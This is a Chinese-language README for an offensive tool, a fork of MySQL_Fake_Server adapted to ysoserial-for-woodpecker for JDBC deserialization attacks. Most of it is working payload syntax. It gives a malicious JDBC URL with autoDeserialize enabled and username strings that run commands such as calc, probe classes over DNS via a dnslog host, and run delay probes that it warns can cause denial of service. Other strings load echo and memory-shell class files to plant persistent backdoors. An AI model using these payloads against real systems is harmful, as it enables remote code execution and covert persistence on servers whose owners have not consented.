### MySQL_Fake_Server-master-啄木鸟yso适配版
原项目：https://github.com/fnmsd/MySQL_Fake_Server
yso地址：https://github.com/woodpecker-framework/ysoserial-for-woodpecker
`JMG`:https://github.com/pen4uin/java-memshell-generator
`JEG`:https://github.com/pen4uin/java-echo-generator

在JDBC反序列化利用过程中出现由于原版yso功能比较单一导致注入内存马的时候比较麻烦所以修改脚本适配ysoserial-for-woodpecker以实现便捷利用漏洞

文件读取未修改

修改userna传参分隔符为‘-’

yso-链-指令

如：yso-CommonsCollections10-sleep:10

#### dns探测class依赖：

```
yso-FindClassByDNS-http://java.lang.String.gpid7sbq.dnslog.pw|java.lang.String
```

![图片](https://github.com/user-attachments/assets/d6d2aaf4-1791-44d2-9705-153450a6adc6)


#### 延时探测class：

实战深度一般在25-28之间，太大会导致dos

```
yso-FindClassByBomb-java.lang.String|28
```

#### 命令执行:

```
url:jdbc:mysql://192.168.157.129:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
username:yso-CommonsCollections10-raw_cmd:calc
```
![图片](https://github.com/user-attachments/assets/fcf9aef2-5701-45d4-9a73-cd6157e6a601)


#### 回显:

class文件由`jEG`生成

```
yso-CommonsCollections10-class_file:/tmp/HttpUtil.class  //class文件在vps的路径
```

![图片](https://github.com/user-attachments/assets/6d256ac3-c10a-4f2d-ab55-577df72fae64)


#### 内存马：

`JMG`生成class

```
yso-CommonsCollections10-class_file:/tmp/DateUtil.class
```

![图片](https://github.com/user-attachments/assets/6d8d6313-f583-44e5-93d4-c730d8041ed6)


文件上传等其他操作参考：

https://github.com/woodpecker-framework/ysoserial-for-woodpecker


